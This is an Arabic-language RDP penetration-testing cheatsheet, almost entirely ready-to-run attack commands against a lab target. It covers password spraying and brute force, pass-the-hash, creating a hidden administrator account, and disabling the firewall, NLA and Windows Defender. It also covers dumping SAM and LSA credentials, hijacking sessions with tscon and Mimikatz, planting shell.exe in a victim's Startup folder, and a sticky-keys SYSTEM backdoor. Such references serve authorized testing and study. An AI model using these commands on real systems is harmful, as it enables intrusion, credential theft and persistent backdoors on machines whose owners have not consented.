# 🖥️ RDP — Cheatsheet الشامل للـ Pentest

> Port الافتراضي: **3389/tcp**

---

## 🔍 1. Enumeration & Recon

### Nmap Scripts

```bash
# الكمند الشامل
nmap -p 3389 -sV -sS -Pn \
  --script rdp-enum-encryption,rdp-ntlm-info,rdp-vuln-ms12-020,rdp-banner \
  10.10.10.10

# كل شيء يخص rdp
nmap --script "rdp-*" -p 3389 10.10.10.10

# SSL cert للـ hostname
nmap --script ssl-cert,rdp-ntlm-info -p 3389 10.10.10.10
```

| Script | ما يكشفه | الأهمية |
|--------|----------|---------|
| `rdp-ntlm-info` | hostname + domain + OS version | ⭐⭐⭐ حرج |
| `rdp-enum-encryption` | NLA status + مستوى التشفير | ⭐⭐⭐ حرج |
| `rdp-vuln-ms12-020` | DoS vulnerability | ⭐⭐ متوسط |
| `rdp-banner` | banner grabbing | ⭐ معلوماتي |

### Basic Connectivity

```bash
# فحص الـ port مفتوح
nc -vn 10.10.10.10 3389
nxc rdp 10.10.10.10

# SSL cert
openssl s_client -connect 10.10.10.10:3389 < /dev/null 2>&1 | openssl x509 -noout -text
```

### تفسير rdp-enum-encryption

| النتيجة | المعنى | الخطورة |
|---------|--------|---------|
| `CredSSP (NLA)` | أحدث — يتطلب credentials قبل الاتصال | ✅ آمن |
| `Classic RDP Security` | قديم — أسهل للاستغلال | ⚠️ متوسط |
| `Encryption: NONE` | لا تشفير — خطير جداً | 🔴 خطر |
| `NLA not required` | جرّب blank password | ⚠️ راجع |

---

## 🔌 2. الاتصال — xfreerdp كامل

```bash
# 1 - الأساسي
xfreerdp /u:user /p:'pass' /v:10.10.10.10 /cert:ignore

# 2 - مع tls-seclevel
xfreerdp /u:user /p:'pass' /v:10.10.10.10 /cert:ignore /tls-seclevel:0

# 3 - port صريح
xfreerdp /u:user /p:'pass' /v:10.10.10.10:3389 /cert:ignore /tls-seclevel:0

# 4 - cert:tofu بدل ignore
xfreerdp /u:user /p:'pass' /v:10.10.10.10 /cert:tofu /tls-seclevel:0

# 5 - xfreerdp3
xfreerdp3 /u:user /p:'pass' /v:10.10.10.10 /cert:ignore /tls-seclevel:0

# 6 - مع domain
xfreerdp /u:user /p:'pass' /d:DOMAIN /v:10.10.10.10 /cert:ignore /tls-seclevel:0

# 7 - بدون NLA (sec:rdp)
xfreerdp /u:user /p:'pass' /v:10.10.10.10 /cert:ignore /sec:rdp

# 8 - sec:tls
xfreerdp /u:user /p:'pass' /v:10.10.10.10 /cert:ignore /sec:tls

# 9 - sec:nla
xfreerdp /u:user /p:'pass' /v:10.10.10.10 /cert:ignore /sec:nla

# 10 - الكامل مع resolution و clipboard
xfreerdp /u:user /p:'pass' /v:10.10.10.10 \
  /cert:ignore /tls-seclevel:0 \
  /size:1920x1080 +clipboard /dynamic-resolution

# 11 - مع drive mapping
xfreerdp /u:user /p:'pass' /v:10.10.10.10 \
  /cert:ignore /timeout:20000 \
  /drive:kali,/home/kali

# 12 - rdesktop كبديل
rdesktop -u user -p 'pass' 10.10.10.10
rdesktop -u user -p 'pass' -d DOMAIN -g 1920x1080 10.10.10.10

# 13 - /cert-ignore (صيغة قديمة)
xfreerdp /cert-ignore /bpp:8 /compression /v:10.10.10.10 /u:user /p:'pass'
```

> **Errors شائعة:**
> - `ERRCONNECT_SECURITY_NEGO_CONNECT_FAILED` → جرّب `/sec:rdp` أو `/tls-seclevel:0`
> - `ERRCONNECT_LOGON_FAILURE` → credentials غلط أو account مقفّل
> - `unable to connect` → الـ port مغلق أو RDP مش مفعّل

### التحقق من صحة الـ credentials

```bash
# impacket
rdp_check DOMAIN/user:'pass'@10.10.10.10

# nxc
nxc rdp 10.10.10.10 -u user -p 'pass'
```

---

## 🔁 3. Password Spray & Brute Force

> ⚠️ راقب password policy أولاً — عشان ما تقفّل الحسابات

```bash
# nxc spray
nxc rdp 10.10.10.10 -u users.txt -p 'Password123' --continue-on-success

# hydra
hydra -V -f -L users.txt -P passwords.txt -s 3389 rdp://10.10.10.10

# hydra spray بكلمة سر واحدة
hydra -L usernames.txt -p 'Password123' 10.10.10.10 rdp

# crowbar
crowbar -b rdp -s 10.10.10.10/32 -U users.txt -c 'Password123'

# ncrack
ncrack -vv --user Administrator -P passwords.txt rdp://10.10.10.10
```

---

## 🔑 4. Pass-the-Hash

```bash
# xfreerdp — يحتاج Restricted Admin mode مفعّل
xfreerdp /u:Administrator /pth:AABBCC... /v:10.10.10.10 /cert:ignore

# nxc
nxc rdp 10.10.10.10 -u Administrator -H NTLM_HASH

# تفعيل Restricted Admin قبل الـ PTH (من shell موجود)
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
```

---

## ⚙️ 5. تفعيل RDP وإضافة User من Shell

```bash
## ═══ إضافة user جديد ═══
net user haxxor Haxxor123! /add
net localgroup Administrators haxxor /add
net localgroup "Remote Desktop Users" haxxor /add

## ═══ تفعيل RDP ═══
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# تعطيل NLA
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f

## ═══ فتح الـ Firewall ═══
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
netsh advfirewall set allprofiles state off    # إيقاف كامل
netsh firewall set opmode disable              # الطريقة القديمة

## ═══ إيقاف WinDefend ═══
sc stop WinDefend

## ═══ من PowerShell ═══
Enable-PSRemoting -Force
Set-SmbServerConfiguration -EnableSMB2Protocol $true -Force
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0

## ═══ بعدها ادخل بـ ═══
xfreerdp /u:haxxor /p:'Haxxor123!' /v:10.10.10.10 /cert:ignore
```

### فحص حالة RDP من الـ target

```bash
# هل RDP مفعّل؟
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections

# الـ port المستخدم
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber

# من PowerShell
Get-WmiObject -Class Win32_TerminalServiceSetting -Namespace root\CIMV2 | Select AllowTSConnections
```

---

## 🔴 6. Post-Exploitation

### Session Enumeration

```bash
# من الـ target
query user
qwinsta
quser

# من الـ attacker (مع creds)
qwinsta /server:10.10.10.10
query user /server:10.10.10.10

# nxc
nxc smb 10.10.10.10 -u admin -p pass --qwinsta
```

### Session Stealing — بدون password (يحتاج SYSTEM)

```bash
query user                          # شوف الـ sessions
tscon <ID> /dest:<SESSIONNAME>      # ادخل على session

# مثال
tscon 2 /dest:rdp-tcp#0

# Mimikatz
ts::sessions
ts::remote /id:2
```

> ⚠️ عند استخدام `tscon` ستُطرد المستخدم من الـ session الحالية

### Credential Dumping بعد الدخول

```bash
# من الـ session مباشرة — CMD مرفوع
reg save HKLM\SAM C:\Temp\sam
reg save HKLM\SYSTEM C:\Temp\system
reg save HKLM\SECURITY C:\Temp\security

# ثم على الـ attacker
impacket-secretsdump -sam sam -system system -security security LOCAL

# أو عبر nxc لو فعّلت SMB
nxc smb 10.10.10.10 -u user -p pass --sam --lsa
nxc smb 10.10.10.10 -u user -p pass -M lsassy
```

### RDPInception — الوصول لـ drive الضحية

```bash
# لو الضحية دخل بـ drive redirection
# \\tsclient\c = الـ C: drive على جهاز الضحية
dir \\tsclient\c

# backdoor في startup
copy shell.exe "\\tsclient\c\Users\targetuser\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
```

### Sticky Keys Backdoor

```bash
# يحتاج SYSTEM
takeown /f C:\Windows\System32\sethc.exe
icacls C:\Windows\System32\sethc.exe /grant administrators:F
copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe

# بعدها: اضغط Shift 5 مرات على شاشة الـ login → CMD كـ SYSTEM
```

---

## 💀 7. CVEs الشائعة

| CVE | الاسم | الخطورة | OS المتأثر |
|-----|-------|---------|-----------|
| CVE-2019-0708 | BlueKeep | 🔴 Critical RCE | Windows 7, Server 2008 |
| CVE-2019-1181 | DejaBlue | 🔴 Critical RCE | Windows 8+, Server 2012+ |
| CVE-2019-1182 | DejaBlue | 🔴 Critical RCE | Windows 8+, Server 2012+ |
| MS12-020 | — | 🟡 DoS | Windows XP–Server 2008 |

```bash
# BlueKeep Check
nmap -p 3389 --script rdp-vuln-ms12-020 10.10.10.10

# Metasploit BlueKeep scanner
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS 10.10.10.10
run
```

> ⚠️ BlueKeep exploit غير مستقر — يؤدي لـ BSOD. في OSCP لا تستخدمه إلا لو طُلب صراحةً.

---

## 🛠️ 8. أدوات بديلة

### SharpRDP — تنفيذ أوامر بدون GUI

```bash
SharpRDP.exe computername=10.10.10.10 username=user password=pass command="whoami"
```

### Tunneling

```bash
# SSH local forward
ssh -L 3389:10.10.10.10:3389 user@jumphost

# ثم
xfreerdp /v:127.0.0.1 /u:user /p:pass
```

### Ports غير افتراضية

```bash
# فحص
nmap -p 3388,3389,3390 10.10.10.10

# الاتصال
xfreerdp /u:user /p:pass /v:10.10.10.10:3388
```

### التثبيت

```bash
sudo apt install -y nmap freerdp2-x11 rdesktop hydra
pip3 install netexec --break-system-packages
```

---

*للاستخدام في بيئات مخوّلة فقط*
